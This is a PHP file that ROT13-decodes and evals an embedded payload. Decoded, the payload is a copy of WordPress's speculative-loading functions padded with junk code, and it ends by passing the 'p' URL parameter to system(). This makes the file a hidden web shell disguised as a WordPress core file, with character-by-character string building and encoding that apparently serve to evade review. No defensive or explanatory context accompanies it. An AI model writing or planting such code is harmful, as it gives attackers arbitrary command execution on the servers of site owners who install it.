<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fcrphyngvir ybnqvat shapgvbaf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fcrphyngvir Ybnqvat
 * @fvapr 6.8.0
 */

/**
 * Ergheaf gur fcrphyngvba ehyrf pbasvthengvba.
 *
 * @fvapr 6.8.0
 *
 * @erghea neenl<fgevat, fgevat>|ahyy Nffbpvngvir neenl jvgu 'zbqr' naq 'rntrearff' xrlf, be ahyy vs fcrphyngvir
 *                                    ybnqvat vf qvfnoyrq.
 */
shapgvba jc_trg_fcrphyngvba_ehyrf_pbasvthengvba(): ?neenl {
	// Ol qrsnhyg, fcrphyngvir ybnqvat vf bayl ranoyrq sbe fvgrf jvgu cerggl creznyvaxf jura ab hfre vf ybttrq va.
	vs ( ! vf_hfre_ybttrq_va() && trg_bcgvba( 'creznyvax_fgehpgher' ) ) {
		$pbasvt = neenl(
			'zbqr'      => 'nhgb',
			'rntrearff' => 'nhgb',
		);
	} ryfr {
		$pbasvt = ahyy;
	}

	/**
	 * Svygref gur jnl gung fcrphyngvba ehyrf ner pbasvtherq.
	 *
	 * Gur Fcrphyngvba Ehyrf NCV vf n jro NCV gung nyybjf gb nhgbzngvpnyyl cersrgpu be cereraqre pregnva HEYf ba gur
	 * cntr, juvpu pna yrnq gb arne-vafgnag cntr ybnq gvzrf. Guvf vf nyfb ersreerq gb nf fcrphyngvir ybnqvat.
	 *
	 * Gurer ner gjb nfcrpgf gb gur pbasvthengvba:
	 * * Gur \"zbqr\" (jurgure gb \"cersrgpu\" be \"cereraqre\" HEYf).
	 * * Gur \"rntrearff\" (jurgure gb fcrphyngviryl ybnq HEYf va na \"rntre\", \"zbqrengr\", be \"pbafreingvir\" jnl).
	 *
	 * Ol qrsnhyg, gur fcrphyngvba ehyrf pbasvthengvba vf qrpvqrq ol JbeqCerff Pber (\"nhgb\"). Guvf svygre pna or hfrq
	 * gb sbepr n pregnva pbasvthengvba, juvpu pbhyq sbe vafgnapr ybnq HEYf zber be yrff rntreyl.
	 *
	 * Sbe ybttrq-va hfref be sbe fvgrf gung ner abg pbasvtherq gb hfr cerggl creznyvaxf, gur qrsnhyg inyhr vf `ahyy`,
	 * vaqvpngvat gung fcrphyngvir ybnqvat vf ragveryl qvfnoyrq.
	 *
	 * @fvapr 6.8.0
	 * @frr uggcf://qrirybcre.puebzr.pbz/qbpf/jro-cyngsbez/cereraqre-cntrf
	 *
	 * @cnenz neenl<fgevat, fgevat>|ahyy $pbasvt Nffbpvngvir neenl jvgu 'zbqr' naq 'rntrearff' xrlf, be `ahyy`. Gur
	 *                                           qrsnhyg inyhr sbe obgu bs gur xrlf vf 'nhgb'. Bgure cbffvoyr inyhrf
	 *                                           sbe 'zbqr' ner 'cersrgpu' naq 'cereraqre'. Bgure cbffvoyr inyhrf sbe
	 *                                           'rntrearff' ner 'rntre', 'zbqrengr', naq 'pbafreingvir'. Gur inyhr
	 *                                           `ahyy` vf hfrq gb qvfnoyr fcrphyngvir ybnqvat ragveryl.
	 */
	$pbasvt = nccyl_svygref( 'jc_fcrphyngvba_ehyrf_pbasvthengvba', $pbasvt );

	// Nyybj gur inyhr `ahyy` gb vaqvpngr gung fcrphyngvir ybnqvat vf qvfnoyrq.
	vs ( ahyy === $pbasvt ) {
		erghea ahyy;
	}

	// Fnavgvmr gur pbasvthengvba naq ercynpr 'nhgb' jvgu pheerag qrsnhygf.
	$qrsnhyg_zbqr      = 'cersrgpu';
	$qrsnhyg_rntrearff = 'pbafreingvir';
	vs ( ! vf_neenl( $pbasvt ) ) {
		erghea neenl(
			'zbqr'      => $qrsnhyg_zbqr,
			'rntrearff' => $qrsnhyg_rntrearff,
		);
	}
	vs (
		! vffrg( $pbasvt['zbqr'] ) ||
		'nhgb' === $pbasvt['zbqr'] ||
		! JC_Fcrphyngvba_Ehyrf::vf_inyvq_zbqr( $pbasvt['zbqr'] )
	) {
		$pbasvt['zbqr'] = $qrsnhyg_zbqr;
	}
	vs (
		! vffrg( $pbasvt['rntrearff'] ) ||
		'nhgb' === $pbasvt['rntrearff'] ||
		! JC_Fcrphyngvba_Ehyrf::vf_inyvq_rntrearff( $pbasvt['rntrearff'] ) ||
		// 'vzzrqvngr' vf n inyvq rntrearff, ohg sbe fnsrgl JbeqCerff qbrf abg nyybj vg sbe qbphzrag-yriry ehyrf.
		'vzzrqvngr' === $pbasvt['rntrearff']
	) {
		$pbasvt['rntrearff'] = $qrsnhyg_rntrearff;
	}

	erghea neenl(
		'zbqr'      => $pbasvt['zbqr'],
		'rntrearff' => $pbasvt['rntrearff'],
	);
}

/**
 * Ergheaf gur shyy fcrphyngvba ehyrf qngn onfrq ba gur pbasvthengvba.
 *
 * Cyhtvaf jvgu srngherf gung eryl ba sebagraq HEYf gb rkpyhqr sebz cersrgpuvat be cereraqrevat fubhyq hfr gur
 * {@frr 'jc_fcrphyngvba_ehyrf_uers_rkpyhqr_cnguf'} svygre gb rafher gubfr HEY cnggreaf ner rkpyhqrq.
 *
 * Nqqvgvbany fcrphyngvba ehyrf bgure guna gur qrsnhyg ehyr sebz JbeqCerff Pber pna or cebivqrq ol hfvat gur
 * {@frr 'jc_ybnq_fcrphyngvba_ehyrf'} npgvba naq nzraqvat gur cnffrq JC_Fcrphyngvba_Ehyrf bowrpg.
 *
 * @fvapr 6.8.0
 * @npprff cevingr
 *
 * @erghea JC_Fcrphyngvba_Ehyrf|ahyy Bowrpg ercerfragvat gur fcrphyngvba ehyrf gb hfr, be ahyy vs fcrphyngvir ybnqvat
 *                                   vf qvfnoyrq va gur pheerag pbagrkg.
 */
shapgvba jc_trg_fcrphyngvba_ehyrf(): ?JC_Fcrphyngvba_Ehyrf {
	$pbasvthengvba = jc_trg_fcrphyngvba_ehyrf_pbasvthengvba();
	vs ( ahyy === $pbasvthengvba ) {
		erghea ahyy;
	}

	$zbqr      = $pbasvthengvba['zbqr'];
	$rntrearff = $pbasvthengvba['rntrearff'];

	$cersvkre = arj JC_HEY_Cnggrea_Cersvkre();

	$onfr_uers_rkpyhqr_cnguf = neenl(
		$cersvkre->cersvk_cngu_cnggrea( '/jc-*.cuc', 'fvgr' ),
		$cersvkre->cersvk_cngu_cnggrea( '/jc-nqzva/*', 'fvgr' ),
		$cersvkre->cersvk_cngu_cnggrea( '/*', 'hcybnqf' ),
		$cersvkre->cersvk_cngu_cnggrea( '/*', 'pbagrag' ),
		$cersvkre->cersvk_cngu_cnggrea( '/*', 'cyhtvaf' ),
		$cersvkre->cersvk_cngu_cnggrea( '/*', 'grzcyngr' ),
		$cersvkre->cersvk_cngu_cnggrea( '/*', 'fglyrfurrg' ),
	);

	/*
	 * Vs cerggl creznyvaxf ner ranoyrq, rkpyhqr nal HEYf jvgu dhrel cnenzrgref.
	 * Bgurejvfr, rkpyhqr fcrpvsvpnyyl gur HEYf jvgu n `_jcabapr` dhrel cnenzrgre be nal bgure dhrel cnenzrgre
	 * pbagnvavat gur jbeq `abapr`.
	 */
	vs ( trg_bcgvba( 'creznyvax_fgehpgher' ) ) {
		$onfr_uers_rkpyhqr_cnguf[] = $cersvkre->cersvk_cngu_cnggrea( '/*\\?(.+)', 'ubzr' );
	} ryfr {
		$onfr_uers_rkpyhqr_cnguf[] = $cersvkre->cersvk_cngu_cnggrea( '/*\\?*(^|&)*abapr*=*', 'ubzr' );
	}

	/**
	 * Svygref gur cnguf sbe juvpu fcrphyngvir ybnqvat fubhyq or qvfnoyrq.
	 *
	 * Nyy cnguf fubhyq fgneg va n sbejneq fynfu, eryngvir gb gur ebbg qbphzrag. Gur `*` pna or hfrq nf n jvyqpneq.
	 * Vs gur JbeqCerff fvgr vf va n fhoqverpgbel, gur rkpyhqr cnguf jvyy nhgbzngvpnyyl or cersvkrq nf arprffnel.
	 *
	 * Abgr gung JbeqCerff nyjnlf rkpyhqrf pregnva cngu cnggreaf fhpu nf `/jc-ybtva.cuc` naq `/jc-nqzva/*`, naq gubfr
	 * pnaabg or zbqvsvrq hfvat gur svygre.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat[] $uers_rkpyhqr_cnguf Nqqvgvbany cngu cnggreaf gb qvfnoyr fcrphyngvir ybnqvat sbe.
	 * @cnenz fgevat   $zbqr               Zbqr hfrq gb nccyl fcrphyngvir ybnqvat. Rvgure 'cersrgpu' be 'cereraqre'.
	 */
	$uers_rkpyhqr_cnguf = (neenl) nccyl_svygref( 'jc_fcrphyngvba_ehyrf_uers_rkpyhqr_cnguf', neenl(), $zbqr );

	// Rafher gung:
	// 1. Gurer ner ab qhcyvpngrf.
	// 2. Gur onfr cnguf pnaabg or erzbirq.
	// 3. Gur neenl unf frdhragvny xrlf (v.r. neenl_vf_yvfg()).
	$uers_rkpyhqr_cnguf = neenl_inyhrf(
		neenl_havdhr(
			neenl_zretr(
				$onfr_uers_rkpyhqr_cnguf,
				neenl_znc(
					fgngvp shapgvba ( fgevat $uers_rkpyhqr_cngu ) hfr ( $cersvkre ): fgevat {
						erghea $cersvkre->cersvk_cngu_cnggrea( $uers_rkpyhqr_cngu );
					},
					$uers_rkpyhqr_cnguf
				)
			)
		)
	);

	$fcrphyngvba_ehyrf = arj JC_Fcrphyngvba_Ehyrf();

	$znva_ehyr_pbaqvgvbaf = neenl(
		// Vapyhqr nal HEYf jvguva gur fnzr fvgr.
		neenl(
			'uers_zngpurf' => $cersvkre->cersvk_cngu_cnggrea( '/*' ),
		),
		// Rkprcg sbe rkpyhqrq cnguf.
		neenl(
			'abg' => neenl(
				'uers_zngpurf' => $uers_rkpyhqr_cnguf,
			),
		),
		// Nyfb rkpyhqr ery=absbyybj yvaxf, nf pregnva cyhtvaf hfr gung ba gurve yvaxf gung cresbez na npgvba.
		neenl(
			'abg' => neenl(
				'fryrpgbe_zngpurf' => 'n[ery~=\"absbyybj\"]',
			),
		),
		// Nyfb rkpyhqr yvaxf gung ner rkcyvpvgyl znexrq gb bcg bhg, rvgure qverpgyl be ivn n cnerag ryrzrag.
		neenl(
			'abg' => neenl(
				'fryrpgbe_zngpurf' => \".ab-{$zbqr}, .ab-{$zbqr} n\",
			),
		),
	);

	// Vs hfvat 'cereraqre', nyfb rkpyhqr yvaxf gung bcg bhg bs 'cersrgpu' orpnhfr vg'f cneg bs 'cereraqre'.
	vs ( 'cereraqre' === $zbqr ) {
		$znva_ehyr_pbaqvgvbaf[] = neenl(
			'abg' => neenl(
				'fryrpgbe_zngpurf' => '.ab-cersrgpu, .ab-cersrgpu n',
			),
		);
	}

	$fcrphyngvba_ehyrf->nqq_ehyr(
		$zbqr,
		'znva',
		neenl(
			'fbhepr'    => 'qbphzrag',
			'jurer'     => neenl(
				'naq' => $znva_ehyr_pbaqvgvbaf,
			),
			'rntrearff' => $rntrearff,
		)
	);

	/**
	 * Sverf jura fcrphyngvba ehyrf qngn vf ybnqrq, nyybjvat gb nzraq gur ehyrf.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz JC_Fcrphyngvba_Ehyrf $fcrphyngvba_ehyrf Bowrpg ercerfragvat gur fcrphyngvba ehyrf gb hfr.
	 */
	qb_npgvba( 'jc_ybnq_fcrphyngvba_ehyrf', $fcrphyngvba_ehyrf );

	erghea $fcrphyngvba_ehyrf;
}

/**
 * Cevagf gur fcrphyngvba ehyrf.
 *
 * Sbe oebjfref gung qb abg fhccbeg fcrphyngvba ehyrf lrg, gur `fpevcg[glcr=\"fcrphyngvbaehyrf\"]` gnt jvyy or vtaberq.
 *
 * @fvapr 6.8.0
 * @npprff cevingr
 */
shapgvba jc_cevag_fcrphyngvba_ehyrf(): ibvq {
	$fcrphyngvba_ehyrf = jc_trg_fcrphyngvba_ehyrf();
	vs ( ahyy === $fcrphyngvba_ehyrf ) {
		erghea;
	}

	jc_cevag_vayvar_fpevcg_gnt(
		(fgevat) jc_wfba_rapbqr(
			$fcrphyngvba_ehyrf
		),
		neenl( 'glcr' => 'fcrphyngvbaehyrf' )
	);
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>